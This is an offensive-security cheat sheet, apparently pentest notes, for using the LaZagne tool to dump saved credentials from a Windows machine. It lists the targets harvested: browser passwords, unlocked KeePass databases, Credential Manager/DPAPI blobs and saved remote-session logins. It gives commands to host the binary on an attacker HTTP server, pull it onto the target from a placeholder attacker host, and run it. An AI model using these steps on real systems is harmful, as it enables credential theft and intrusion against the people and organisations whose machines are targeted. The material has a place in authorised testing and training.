# Lazagne Credential Extraction

Dumps stored credentials from browsers, KeePass (if the vault is open/unlocked), Windows Credential Manager, and other applications in a single run.

```cmd
lazagne.exe all
```

Key targets harvested:
- Browser saved passwords (Chrome, Firefox, IE/Edge)
- KeePass — if the database is open and protected only by the Windows account (no separate master password), Lazagne extracts it from the live session without needing the master password
- Windows Credential Manager / DPAPI-protected blobs
- WinSCP, FileZilla, mRemoteNG saved sessions

Transfer the binary first (no installation needed):
```bash
# attacker
python3 -m http.server 8080

# target (PowerShell)
iwr http://<LHOST>:8080/lazagne.exe -OutFile C:\Users\Public\lz.exe
C:\Users\Public\lz.exe all
```

Dump only a specific module if you want less noise:
```cmd
lazagne.exe browsers
lazagne.exe keepass
lazagne.exe windows
```
